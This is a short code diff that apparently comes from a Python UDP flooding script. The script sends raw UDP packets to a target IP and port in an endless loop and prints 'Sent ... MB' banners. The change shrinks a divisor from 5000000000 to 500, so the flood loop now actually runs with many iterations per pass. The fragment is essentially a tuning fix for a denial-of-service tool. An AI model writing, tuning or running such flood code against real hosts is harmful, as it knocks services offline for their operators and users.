@@ -145,7 +145,7 @@ nx=len(("││ ID:%s  │  Sent %sMB to %s port:%s"%(str((id)).zfill(4),c,ipp,o
 print("―"*nx)
 
 while True:
-     for i in range(int(threads/5000000000)):
+     for i in range(int(threads/500)):
          sock.sendto(bytes, (ipp,int(open)))
          sock.sendto(bytes, (ipp,int(open)))
          sock.sendto(bytes, (ipp,int(open)))
